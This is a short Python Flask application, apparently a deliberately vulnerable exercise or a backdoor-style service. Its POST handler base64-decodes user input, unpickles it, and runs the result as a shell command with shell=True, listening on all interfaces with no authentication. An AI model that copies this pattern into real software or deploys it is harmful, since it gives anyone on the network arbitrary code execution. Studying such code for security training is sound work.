from flask import Flask, request, render_template
import pickle
import base64
import os
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.form['data']
        try:
            decoded_data = base64.urlsafe_b64decode(data)
            obj = pickle.loads(decoded_data)
            result = execute_command(obj)
        except Exception as e:
            result = None  
        return render_template('index.html', result=result)
    return render_template('index.html', result=None)

def execute_command(cmd):
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        if process.returncode == 0:
            if output:
                return output.decode('utf-8')
            else:
                return "Command executed successfully"
        else:
            if error:
                return error.decode('utf-8')
            else:
                return "Error executing command"
    except Exception as e:
        pass  # Do nothing in case of exception

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)